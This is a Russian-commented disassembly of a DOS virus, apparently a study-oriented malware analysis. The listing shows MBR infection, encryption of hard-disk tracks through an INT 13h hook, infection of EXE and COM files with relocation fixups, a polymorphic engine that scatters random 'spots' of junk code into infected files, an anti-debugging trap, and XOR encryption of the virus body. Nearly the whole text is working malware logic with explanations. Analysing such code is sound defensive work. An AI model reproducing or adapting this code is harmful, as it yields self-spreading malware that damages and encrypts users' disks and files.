 0439  E2 EC		loop	ScanPartitn	; Диск не шифрабельный, Next ?
						; Жаль, нечего шифровать
 043B  5E		pop	si
 043C  5A		pop	dx
 043D  59		pop	cx
 043E		loc_25:				;  /xref 03D8,03EC,03F5,0419/
						;  /     047B, 0499         /
 043E  E9 FE92		jmp	loc_18		; (02D3)

		== Диск для шифрования найден.
 0441		loc_26:				;  /xref 042C, 0434/
 0441  8B 4F 02		mov	cx,[bx+2]	; нач. сектор/циллиндр
 0444  8A 77 01		mov	dh,[bx+1]	; нач. головка
 0447  E8 0363		call	GetTrackNo	; (07AD)
					        ; Выход: SI=число дорожек
 044A  83 C6 07		add	si,7		; первые 7 дорожек не трогаем
						; - там критические места
 044D  89 B5 00F8	mov	00F8[di],si	; нижняя граница шифрования
 0451  96		xchg	si,ax
 0452  8B 4F 06		mov	cx,[bx+6]	; кон. сектор/циллиндр
 0455  8A 77 01		mov	dh,[bx+1]       ; кон. головка
 0458  E8 0352		call	GetTrackNo	; (07AD) SI=дорожек
 045B  89 B5 0882	mov	word ptr ds:[882h][di],si
 045F  89 B5 048C	mov	word ptr ds:[48Ch][di],si
 0463  03 C6		add	ax,si		; (нач.+кон.дорожки)/2
 0465  D1 E8		shr	ax,1		; середина диска
 0467  89 85 015A	mov	word ptr ds:[15Ah][di],ax

		== записываем свое тело (7 секторов) на диск
 046B  5E		pop	si		; /push 041B/
 046C  5A		pop	dx		; адрес тела вируса
 046D  59		pop	cx
 046E  B8 0307		mov	ax,0307h
 0471  87 DE		xchg	bx,si
 0473  41		inc	cx		; после оригинальн.MBR
 0474  89 8F 00C6	mov	00C6[bx],cx	; запомним адрес начала
						; тела
 0478  E8 FE22		call	Int13Call	;/029D/
 047B  72 C1		jc	loc_25

 047D ·8D B7 00AA	lea	si,00AA[bx]	; (адрес MBR-ной части вируса)
 0481 ·8D BF 0DD8	lea	di,ds:0DD8[bx]	; (туда, где считан MBR)
 0485  57		push	di
 0486  B9 0029		mov	cx,29h		; длина процедуры
 0489  F3/ A4		rep	movsb
 048B  B8 0332		mov	ax,0332h
				   ^^^^ последняя дорожка диска  /xref 045B/
       		      ;  (точнее,последняя шифрованная,но диск пока еще чист)
 048E  AB		stosw
 048F  B8 0301		mov	ax,301h		; пишем в MBR
 0492  5B		pop	bx
 0493  B9 0001		mov	cx,1
 0496  E8 FE04		call	Int13Call	; (029D)
 0499  72 A3		jc	loc_25

 049B		loc_27:				;  /xref 03E3/
 049B  5B		pop	bx

			== Лечение в памяти
 049C		CureInRAM:			;  /xref 034C/
 049C  0E		push	cs
 049D  1F		pop	ds
 049E  0E		push	cs
 049F  07		pop	es
 04A0  8D B7 0040	lea	si,ds:40h[bx]	; адрес оригинальных байт
						; (под пятнами)
 04A4  81 C3 002A	add	bx,2Ah		; адрес таблицы пятен  002A
 04A8  B9 000A		mov	cx,0Ah		; 10 пятен
 04AB		locloop_29:			;  xref 04B6
 04AB  8B 3F		mov	di,[bx]		; адрес очередного пятна
 04AD  51		push	cx
 04AE  B9 000A		mov	cx,0Ah		; 10-ти байтовое пятно
 04B1  F3/ A4		rep	movsb		; восстанавливаем
 04B3  59		pop	cx
 04B4  43		inc	bx
 04B5  43		inc	bx
 04B6  E2 F3		loop	locloop_29

 04B8  07		pop	es
 04B9  83 C3 D2		add	bx,-002Eh	
 04BC  8C C7		mov	di,es
 04BE  83 C7 10		add	di,10h		; CS=0 для EXEфайла (DS+/PSP/)
 04C1  01 7F 16		add	[bx+16h],di	; /0026h/  CS для EXE
 04C4  01 7F 0E		add	[bx+0Eh],di	; /001Eh/  SS для EXE
			; Примечание:  мы имеем дело с заголовком "чистого"
			; EXE файла, до заражения его
 04C7  83 7F 06 00	cmp	word ptr [bx+6],0
 04CB  74 67		je	loc_34		; нет перемещаемых элементов

	== Relocation Table найдена
	== Ищем свое имя в Environment		

 04CD  26: 8E 1E 002C	mov	ds,es:002С
 04D2  33 F6		xor	si,si
 04D4		ContScan:
 04D4  46		inc	si
 04D5  83 3C 00		cmp	word ptr [si],0
 04D8  75 FA		jne	ContScan
 04DA  83 C6 04		add	si,4
 04DD  87 D6		xchg	dx,si

 04DF  B8 3D00		mov	ax,3D00h
 04E2  CD 21		int	21h		; открываем наш файл-носитель
 04E4  72 73		jc	Terminate	; /0559/
 04E6  0E		push	cs
 04E7  1F		pop	ds
 04E8  89 87 0287	mov	word ptr ds:[287h][bx],ax
	== указатель на начало Relocation Table
 04EC  8B 57 18		mov	dx,[bx+18h]
 04EF  B8 4200		mov	ax,4200h
 04F2  E8 FDA0		call	CallDOS 	; /0295/ 
 04F5  06		push	es
 04F6  97		xchg	di,ax

	== читаем Relocation Table по 29E элементов
 04F7		ReadPortion:				; /xref 052C/
 04F7  50		push	ax
 04F8  8D 97 054D	lea	dx,cs:[54Dh][bx]
 04FC  8B 4F 06		mov	cx,[bx+6]
 04FF  81 F9 029E	cmp	cx,29Eh
 0503  72 03		jb	loc_32
 0505  B9 029E		mov	cx,29Eh
 0508		loc_32:				;  /xref 0503/
 0508  29 4F 06		sub	[bx+6],cx
 050B  51		push	cx
 050C  D1 E1		shl	cx,1
 050E  D1 E1		shl	cx,1		; длина считываемого
 0510  B4 3F		mov	ah,3Fh		; читаем таблицу
 0512  E8 FD80		call	CallDOS		; (0295)
 0515  72 42		jc	Terminate	; /0559/ завершаем программу
 0517  59		pop	cx
 0518  58		pop	ax
 0519  87 F2		xchg	si,dx

			; SI=адрес  считанной Relo   AX=DS+10h для EXE
			; CX=порция Relo элементов

	== настраиваем Relocation Table (против себя)

 051B		locloop_33:			;  /xref0526/
 051B  01 44 02		add	[si+2],ax
 051E  C4 3C		les	di,dword ptr [si]
 0520  26: 01 05	add	es:[di],ax
 0523  83 C6 04		add	si,4
 0526  E2 F3		loop	locloop_33

 0528  83 7F 06 00	cmp	word ptr [bx+6],0	; еще остались рело ?
 052C  77 C9		ja	ReadPortion		; да (04F7)
 052E  07		pop	es			; /push 04F5/
 052F  B4 3E		mov	ah,3Eh			; закрываем файл
 0531  E8 FD61		call	CallDOS			; /0295/
 0534		loc_34:					;  /xref04CB/
 0534  06		push	es
 0535  1F		pop	ds
 0536  2E: 80 7F 12 00	cmp	byte ptr cs:[bx+12h],0	; тип файла 0 = COM
 053B  75 0D		jne	loc_35

		    == возврат управления COM файлу
 053D  8B F3		mov	si,bx
 053F ·BF 0100		mov	di,0100h
 0542  B9 0003		mov	cx,3
 0545  F3/ A4		rep	movsb
 0547  58		pop	ax
 0548  EB 0B		jmp	short loc_36		; (0555)

      		     == возврат управления EXE файлу
 054A	             loc_35:				;  /xref 053B/
 054A  58		pop	ax
 054B  FA		cli
 054C  2E: 8B 67 10	mov	sp,cs:[bx+10h]
 0550  2E: 8E 57 0E	mov	ss,cs:[bx+0Eh]
 0554  FB		sti
 0555		     loc_36:				;  /xref 0548/
 0555  2E: FF 6F 14	jmp	dword ptr cs:[bx+14h]	; ориджинал программ
 0559		     Terminate:				;  /xref 04E4, 0515/
 0559  B4 4C		mov	ah,4Ch
 055B  CD 21		int	21h

████ PROCEDURE GET_RND ████

==== Получить случайное число в DX.
==== Hа входе : DX=верхняя граница для RND.

;         Called from:   525D:05E4, 05F3, 065C, 0673, 0686, 06A7, 06C1
;                        0709, 0912, 0925, 0931, 09AD

	   GETRND:	; Entry data= DX

055D  2E: 89 36 05A8	mov	word ptr cs:[5A8h],si	;
0562  50		push	ax			;(si)  сохраним для
							;выхода из процедуры
0563  53		push	bx
0564  51		push	cx
0565  52		push	dx

0566  B9 4D31		mov	cx,4D31h
	 ^^^^			   ^^^^ 	; /xref 058A/ RND
0569  BB CFA4		mov	bx,0CFA4h
056A     ^^^^			   ^^^^^        ; RND
056C  BA 015A		mov	dx,015Ah	; константа
056F  B8 4E35		mov	ax,4E35h	; константа
0572  96		xchg	si,ax
0573  92		xchg	dx,ax
0574  85 C0		test	ax,ax
0576  74 02		jz	loc_38
0578  F7 E3		mul	bx		
057A		loc_38:				; /xref 0576/
057A  E3 05		jcxz	loc_39		;
057C  91		xchg	cx,ax
057D  F7 E6		mul	si		
057F  03 C1		add	ax,cx
0581		loc_39:				; /xref 057A/
0581  96		xchg	si,ax
0582  F7 E3		mul	bx		
0584  03 D6		add	dx,si
0586  40		inc	ax
0587  83 D2 00		adc	dx,0
058A  2E: A3 056A	mov	word ptr cs:[56Ah],ax	; новые RND для след.
058E  2E: 89 16 0567	mov	word ptr cs:[567h],dx	; вызова
0593  8B C2		mov	ax,dx
0595  59		pop	cx
0596  33 D2		xor	dx,dx		
0598  E3 02		jcxz	loc_40		
059A  F7 F1		div	cx		
059C		loc_40:					; /xref 0598/
059C  59		pop	cx
059D  5B		pop	bx
059E  58		pop	ax
059F  5E		pop	si			; входное DX
05A0  56		push	si

			== Единственный антитрассировочный прием
05A1  2E: 80 3C CC	cmp	byte ptr cs:[si],0CCh   ;
05A5		loc_41:					;
05A5  74 FE		je	loc_41			; зависание
05A7  BE 05CB		mov	si,05CBh		; SI, сохраненное
				   ^^^^			; сюда при входе
				                        ; /xref 055D/
05AA  C3		retn
	    GETRND	endp

	== ТАБЛИЦА :  Длина комманды - комманда,...

 05AB  01
 05AC  50 		    PUSH AX
 05AD  01
 05AE  16       CodePushSS  PUSH SS		;  /xref 065F, 0668/
 05AF  01
 05B0  1F 		    POP  DS
 05B1  03
 05B2  BE		    MOV  DI,....
 05B3  1110	 d_05B3 	   1110h	;  /xref 09B4/
 05B5  03
 05B6  BA		    MOV  AX,....
 05B7  9AB2	MovAXoper	    9ab2h	;  /xref 0928/
 05B9  02
 05BA  31 14 		    XOR  [DI],AX
 05BC  04
 05BD  81 C2		    ADD   AX,....
 05BF  F177	AddAxOper	     F177h	;  /xref 0934/
 05C1  01
 05C2  46		    INC   DI
 05C3  04
 05C4  81 FE		    CMP   DI,....
 05C6      	d_05C6     	     1EE8h	; конец тела /xref 09CB, 0A0D/
 05C8  02
 05C9  75 EF		    JNE   ....

	== Однобайтовые комманды          /xref 05DE/
 05CB  90 F9 F8 FB 2E 36 3E FC FD F5

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
; 	  Сформировать цепочку случайных однобайтовых комманд по адресу [DI]
;	  Входные данные:  DX = число комманд
;        /Called from: 05F8,0610/
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

		FormCommChain	proc	near
 05D5  0B D2		or	dx,dx
 05D7  74 16		jz	ExitFormCommChain
 05D9  56		push	si
 05DA  51		push	cx
 05DB  52		push	dx
 05DC  8B CA		mov	cx,dx	        ; необходимое число комманд
 05DE		locloop_42:			;  /xref 05EA/
 05DE  BE 05CB		mov	si,056В
 05E1  BA 000A		mov	dx,0Ah
 05E4  E8 FF76		call	Get_RND  ; (055D) получить RND 00..09
 05E7  03 F2		add	si,dx    ; выбрать одну из комманд,
					 ; занести в ES:[DI]
 05E9  A4		movsb
 05EA  E2 F2		loop	locloop_42

 05EC  5A		pop	dx
 05ED  59		pop	cx
 05EE  5E		pop	si

 05EF		ExitFormCommChain:			
 05EF  C3		retn
		FormCommChain	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;	  Заполнить пятно случайными байтами
;         Called from:   525D:0702, 070C
;
;			 В  DX=кол-во байт
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

		FillRndBytes	proc	near
 05F0  8B C2		mov	ax,dx
 05F2  42		inc	dx
 05F3  E8 FF67		call	GetRND		; (055D)
 05F6  2B C2		sub	ax,dx		; В границах от RND до DX
 05F8  E8 FFDA		call	FormCommChain	; цепочка из DX RND комманд
 05FB  92		xchg	dx,ax
 05FC  F3/ A4		rep	movsb		; качаем
 05FE ·81 FB 003C	cmp	bx,003Сh	;
 0602  75 0C		jne	loc_44
 0604  A1 0034		mov	ax,ds:0034h
 0607  2B C7		sub	ax,di
 0609  05 0F3B		add	ax,0F3Bh
 060C  2B 07		sub	ax,[bx]
 060E  4F		dec	di
 060F  AA		stosb
 0610		loc_44:				;  /xref 0602/
 0610  E8 FFC2		call	FormCommChain	; (05D5)
 0613  C3		retn
		FillRndBytes	endp

     == Таблица ссылок на те места в Таблице команд(05AB), которые необходимо
     == менять (возможно, здесь что-то напутано при дизассемблировании)

 0614  B6 05	data_91				;  /xref 066D/  ; MOV AX
 0616  BB 05							; XOR AX
 0618  BE 05							; ADD AX
 061A  B2 05	d_061A				;  /xref 0680/  ; MOV DI
 061E  BB 05							; XOR DI
 0620  C2 05							; INC DI
 0622  C5 05							; CMP DI

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;         Called from:   525D:067D, 0697
; Изменить регистры в командах таблицы. Вызывается 2 раза - для общих и для
; индексных регистров.
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

;	Суть настройки регистров в следующем:
;	хекс-коды инструкций с регистрами расположены по порядку:
;	к примеру, B8 = MOV AX.  Далее идут: B9 =MOV CX, и т.д.
;       в порядке  AX,CX,DX,BX,SP,BP,SI,DI.
;	Для формирования одной из 8 комманд просто прибавляем к B8 порядко-
;	вый номер от 0 до 7. Аналогично ведут себя многие другие комманды.

		ChangeCommand	proc	near
 0622		loc_45:						;  /xref 0656/
				; DS:SI - таблица указателей на смещения
				; таблицы комманд, которые
				; необходимо настроить
				; DL = RND от 0 до 7, исключая 4 (SP)
 0622  AD		lodsw
 0623  97		xchg	di,ax
 0624  8A C2		mov	al,dl		; RND от 0 до 7
 0626  81 FE 061E	cmp	si,61Eh		; Адрес комманды из таблицы-
						; далее относится к диапазону
						: 0614..0622
 062A  75 08		jne	loc_46
 062C  24 05		and	al,00000101B
 062E  3C 01		cmp	al,1
 0630  75 12		jne	loc_47
 0632  B0 07		mov	al,7
 0634		loc_46:
 0634  81 FE 0618	cmp	si,0618h
 0638  75 0A		jne	loc_47
 063A  B1 03		mov	cl,3
 063C  D2 E0		shl	al,cl
 063E  08 05		or	[di],al
 0640  0C C7		or	al,0C7h
 0642  EB 04		jmp	short loc_48	; (0648)
 0644		loc_47:				;  /xref 0630, 0638/
 0644  08 05		or	[di],al
 0646  0C F8		or	al,0F8h
 0648		loc_48:				;  /xref 0642/
 0648  20 05		and	[di],al
 064A  81 FE 061A	cmp	si,61Ah
 064E  74 08		je	loc_ret_49
 0650  81 FE 0622	cmp	si,622h		; конец таблицы
 0654  74 02		je	loc_ret_49
 0656  EB CA		jmp	short loc_45	; (0622)

 0658		loc_ret_49:			;  /xref 064E, 0654/
 0658  C3		retn
		ChangeCommand	endp

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;         Called from 0A13
;	  Создаем пятна и заполняем ими заражаемый файл
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

			MakeSpot     proc  near
			== Формируем комманды PUSH SS или PUSH CS
 0659  BA 0002		mov	dx,2			; RND 0..1
 065C  E8 FEFE		call	GetRND			; Подбросим монетку...
 065F  C6 06 05AE 0E	mov	CodePUSHSS,0Eh		; /05AE/
 0664  0B D2		or	dx,dx
 0666  74 05		jz	loc_50
 0668  C6 06 05AE 16	mov	data_85,16h

 066D		loc_50:					;  /xref 0666/
 066D ·BE 0614		mov	si,offset data_91	; таблица ссылок на
							; таблицу комманд
							; для комманд с общими
							; регистрами
 0670		GetRegister:				;  /xref 0679/
 0670  BA 0008		mov	dx,8			; RND 0..7
 0673  E8 FEE7		call	GetRND			; (055D)
 0676  80 FA 04		cmp	dl,4
 0679  74 F5		je	GetRegister	; Регистр SP не подходит,
						; повторим опреацию
 067B  8A DA		mov	bl,dl		; запоминаем этот случайный
						; регистр, чтобы избежать
						; повторения
 067D  E8 FFA2	call	ChangeCommand		; (0622)

		== Формируем SI DI BX
 0680  BE 061A		mov	si,d_061A       ; таблица ссылок на таблицу
				       		  ; комманд для настройки
						  ; некоторых индексных рег-ов
 0683		loc_52:				  ; /xref 0695/
 0683  BA 0003		mov	dx,3
 0686  E8 FED4		call	GetRND		; (055D)
 0689  80 C2 06		add	dl,6
 068C  80 FA 08		cmp	dl,8
 068F  75 02		jne	loc_53		; SI или DI
 0691  B2 03		mov	dl,3		; BX
 0693		loc_53:				;  /xref 068F/
 0693  3A D3		cmp	dl,bl		; Если этот регистр уже
						; использовали, ищем другой
 0695  74 EC		je	loc_52
 0697  E8 FF88		call	ChangeCommand	; (0622)  Делаем настройку
 069A  33 C9		xor	cx,cx
 069C  BF 002A		mov	di,2Ah

 069F		loc_54:				;  /xref 06D8, 06E3/
 069F ·83 F9 09		cmp	cx,9		; Последнее пятно - особое
 06A2  75 1A		jne	loc_56

		== Последнее Пятно ( The Last Spot )

 06A4		loc_55:				;  /xref 06B4, 06BA/
 06A4  BA 00C8		mov	dx,0C8h		; 200
 06A7  E8 FEB3		call	GetRND		; RND 0..199
 06AA  83 EA 64		sub	dx,64h		; Число от -100 до +99
 06AD  03 16 0034	add	dx,ds:0034h	; Адрес пятна, на которое будет
						; передаваться управление при
						; цикле в пятнах
 06B1  83 FA 00		cmp	dx,0		; не вышли ли за границы файла
 06B4  7C EE		jl	loc_55		; снизу 	
 06B6  3B 16 06BF	cmp	dx,ds:06BFh     ; верхний предел
 06BA  7D E8		jge	loc_55		
 06BC  EB 06		jmp	short loc_57	; (06C4)
 06BE		loc_56:				;  /xref 06A2/
 06BE  BA 04CA		mov	dx,04CAh	; 
				   ^^^^		;  /xref 09DB/
 06C1  E8 FE99		call	GetRND		; RND 0..04C9
 06C4		loc_57:				;  /xref 06BC/
 06C4  E3 17		jcxz	loc_60

 06C6 ·BE 002A		mov	si,002Ah	; Адрес таблицы пятен
 06C9  51		push	cx

 06CA		locloop_58:			;  /xref 06DA/
				; расстояние между новым пятном и всеми осталь-
				; ными должно быть не менее 10 байт
 06CA  AD		lodsw
 06CB  2B C2		sub	ax,dx		
 06CD  3D 000A		cmp	ax,10		
 06D0  7D 08		jge	loc_59	
 06D2  3D FFF6		cmp	ax,-10		
 06D5  7E 03		jle	loc_59
 06D7  59		pop	cx
 06D8  EB C5		jmp	short loc_54	; (069F)
 06DA		loc_59:				;  /xref 06D0, 06D5/
 06DA  E2 EE		loop	locloop_58	; сканируем таблицу пятен

 06DC  59		pop	cx
 06DD		loc_60:				;  /xref 06C4/
 06DD  92		xchg	dx,ax
 06DE  AB		stosw			
 06DF  41		inc	cx
 06E0  83 F9 0A		cmp	cx,0Ah
 06E3  72 BA		jb	loc_54
 06E5 ·BB 002A		mov	bx,002Ah	; адрес таблицы пятен
 06E8 ·BE 05AB		mov	si,05ABh	; таблица комманд
 06EB		loc_61:				;  /xref 076E/
 06EB ·BF 0F3B		mov	di,0F3Bh	; буфер для формирования пятен
 06EE  AC		lodsb	
 06EF  8A C8		mov	cl,al		; длина комманды
 06F1  BA 0008		mov	dx,8		; макс. кол-во RND байт
 06F4  2B D1		sub	dx,cx
 06F6  8B 47 02		mov	ax,[bx+2]
 06F9  2B 07		sub	ax,[bx]
 06FB  3D 000A		cmp	ax,0Ah		; соседние пятна расположены
						; вплотную ?
 06FE  75 09		jne	loc_62          
 0700  42		inc	dx		; увеличить диапазон до 10
 0701  42		inc	dx	
 0702  E8 FEEB	  	call    FillRndBytes	; (05F0)
 0705  43	 	inc	bx		; следующее пятно
 0706  43		inc	bx
 0707  EB 2A		jmp	short loc_64	  (0733)
 0709		loc_62:				;  /xref 06FE/
						; пятна расположены не вплотную
						; нужно ставить JMP
 0709  E8 FE51		call	GetRND		; (055D)
 070C  E8 FEE1		call	FillRndBytes	; (05F0)
 070F  8B D7		mov	dx,di		; указатель на хвост буфера
 0711  81 EA 0F38	sub	dx,0F38h	; АдресHачалаБуфера-3
 0715  03 17		add	dx,[bx]		; + смещение пятна
 0717  B0 E9		mov	al,0E9h		; JMP NEAR
 0719  AA		stosb		
 071A  43		inc	bx				
 071B  43		inc	bx		
 071C  8B 07		mov	ax,[bx]		; адрес следующего пятна 
 071E  2B C2		sub	ax,dx		; расстояние между JMP'ером
						; и пятном назначения
 0720  3D 007E		cmp	ax,7Eh		; а не сделать ли JMP SHORT
 0723  7F 0D		jg	loc_63
 0725  3D FF7F		cmp	ax,-80h
 0728  7C 08		jl	loc_63
 072A  40		inc	ax		; коррекция для JMP SHORT
 072B  C6 45 FF EB	mov	byte ptr [di-1],0EBh   ; JMP SHORT, а не NEAR
 072F  AA		stosb
 0730  EB 01		jmp	short loc_64	; (0733)
 0732		loc_63:				;  /xref 0723, 0728/
 0732  AB		stosw			; ставим адрес JMP'ера для NEAR
 0733		loc_64:				;  /xref 0707, 0730/
 0733  53		push	bx
 0734  51		push	cx
 0735  B9 0000		mov	cx,0		; установка файлового указателя
          ^^^^					; /xref 09EA  / 	
 0738  BA 0B3D		mov	dx,0B3Dh
          ^^^^					; /xref 09EE  /
 073B  03 57 FE		add	dx,[bx-2]	; адрес предыдущего пятна
 073E  83 D1 00		adc	cx,0		; CX+CarryFlag
 0741  51		push	cx		
 0742  52		push	dx
 0743  E8 019B		call	FSeekBoF	; (08E1) Hа начало пятна
 0746  B9 000A		mov	cx,10		
 0749  BA 00A4		mov	dx,0A4h
				   ^^^^		; Xref 091Bh=40h,074Ch
 074C  01 0E 074A	add	ds:074A,cx      ; +10 (строка вверху)
 0750  E8 0180		call	FRead		; (08D3) читаем оригинальные 
						; байты под пятном
 0753  5A		pop	dx
 0754  59		pop	cx
 0755  72 0D		jc	loc_65
						; место под пятном прочитано 
 0757  E8 0187		call	FSeekBoF	; успешно (08E1)
 075A  87 CF		xchg	cx,di		
 075C  BA 0F3B		mov	dx,0F3Bh	; адрес буфера, где хранится
						; сформированное пятно
 075F  2B CA		sub	cx,dx		
 0761  E8 6B 01		call    08CF		; записать наше пятно
 0764		loc_65:				;  /xref 0755/
 0764  59		pop	cx
 0765  5B		pop	bx
 0766  72 09		jc	loc_ret_66
 0768  81 FB 003E	cmp	bx,3Eh		; все ли пятна пройдены ?
 076C  73 03		jae	loc_ret_66	
 076E  E9 FF7A		jmp	loc_61		; (06EB) на следующее пятно
 0771		loc_ret_66:			;  /xref 0766, 076C/
 0771  C3		retn
		MakeSpot	endp

============================================================================

▀    ▀     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
0DD8 0772  B9 0DD8	   mov	cx,0DD8h     ; размер вируса
0DDB 0775  33 D2	   xor	dx,dx	     ; стартовый адрес
0DDD 0777  E8 0016	   call	CryptBody    ; шифруем тело с DS:0000
0DE0 077A  B4 40	   mov	ah,40h	     ; запись в файл
0DE2 077C  8B 1E 0F39	   mov	bx,ds:0F39h  ; хендл
0DE6 0780  9C		   pushf	     ; 		
0DE7 0781  9A 0000:0000	        	     ; вызов оригинального INT21
0DE8 0781     ^^^^^^^^^		 	     ; установка с помощью 1C из MBR
0DEC 0786  72 02	   jc	loc_67	     
0DEE 0788  3B C1	   cmp	ax,cx
0DF0 078A	    loc_67:	
0DF0 078A  9C		   pushf				
0DF1 078B  E8 0002	   call CryptBody    ; (0790,0DF6)
0DF4 078E  9D		   popf				
0DF5 078F  C3		   retn

▄▄▄▄▄▄▄▄▄▄▄▄ 		   Шифрование тела ; /xref 0777,078B/

		CryptBody	proc	near
0DF6 0790  51			push	cx
0DF7 0791  8B F2		mov	si,dx
0DF9 0793  B8 0000		mov	ax,0000      	; маска XOR
0DFA 0794     ^^^^			   ^^^^
0DFC 0796  B9 0DD8		mov	cx,0DD8h
		    ContXOR:
0DFF 0799  31 04		xor	[si],ax
0E01 079B 05 0000	        add	ax,0000     	; смещение XORа
0E02 079C    ^^^^	                   ^^^^
079E 46				inc	si
079F E2 F8			loop    ContXOR
07A1 59				pop	cx
07A2 C3				retn
		CryptBody	endp

		INT 24 HANDLER
		▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
0E09 07A3  B0 03 CF	      mov al,03
			      iret

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;         Called from:   0850, 08C3	Вызов оригинального INT 13h

		sub_14		proc	near
 07A6  9C			pushf				
 07A7  2E: FF 1E 0F35	call	dword ptr cs:0F35h	
 07AC  C3			retn
		sub_14		endp


============================================================================

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;      	  /xref  0447,0458,0873/
;	  Возвращает в SI число дорожек, исходя из CX,DX

		  GetTrackNo	proc	near
 07AD  51		push	cx
 07AE  52		push	dx
 07AF  D0 E9		shr	cl,1
 07B1  D0 E9		shr	cl,1
 07B3  80 E6 C0		and	dh,0C0h
 07B6  0A F1		or	dh,cl
 07B8  B1 04		mov	cl,4
 07BA  D2 EE		shr	dh,cl
 07BC  8A D5		mov	dl,ch
 07BE  87 F2		xchg	si,dx
 07C0  5A		pop	dx
 07C1  59		pop	cx
 07C2  C3		retn
		  GetTrackNo	endp

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;         SUBROUTINE  Шифрование сектора.
;         Called from:   08C0, 08C7

	     SecCrypt   proc	near
 0E29  50		push	ax
       53		push	bx
       51		push	cx
 0E2C  B0 00		mov	al,00
				   ^^		; /xref 010F,086A/ макс.сект.
						; на диске
 0E2E  BB 0000		mov	bx,0000		; /xref 0116, 086F/
 0E2F				   ^^^^		; адрес буфера с секторами
 07CB		CryptOne:			; /xref 07D9/
 07CB  B9 0100		mov	cx,0100h
 07CE		ContSecCrypt:			; /xref 07D5/
 07CE  26: 81 37 3CF6	xor	word ptr es:[bx],3CF6h
						 ^^^^   ; /xref 0373/
						; значение таймера
 07D3  43		inc	bx
 07D4  43		inc	bx
 07D5  E2 F7		loop	ContSecCrypt
 07D7  FE C8		dec	al
 07D9  75 F0		jnz	CryptOne	; след. сектор
 07DB  59		pop	cx
 07DC  5B		pop	bx
 07DD  58		pop	ax
 07DE  C3		retn
 	    SecCrypt	endp


; ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ INT 13h HANDLER ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

 07DF  80 FC 02		cmp	ah,2		; чтение
 07E2  74 08		je	RWHandler
 07E4  80 FC 03		cmp	ah,3		; запись
 07E7  74 03		je	RWHandler
 07E9  E9 00E2		jmp	Int13Exit	; (08CE)

	== Обрабатываются функции чтения и записи (2 и 3)

 07EC		RWHandler:			;  /xref 07E2,07E7/
 07EC  81 FA 0080	cmp	dx,80h
 07F0  75 6C		jne	loc_80
		== Винт, головка 0
 07F2  F7 C1 FFC0	test	cx,0FFC0h
 07F6  75 66		jnz	loc_80
		== Сектора по 3Fh включительно
 07F8  53		push	bx
 07F9  52		push	dx
 07FA  56		push	si
 07FB  57		push	di
 07FC  51		push	cx
 07FD  51		push	cx
 07FE  8B F0		mov	si,ax
 0800  81 E6 00FF	and	si,0FFh
 0804  8B FE		mov	di,si		; число секторов
 0806  B0 01		mov	al,1
 0808  50		push	ax

 0809  74 2E	jz	loc_75		; ноль секторов ?!! ERROR !
					; обрабатывает сам
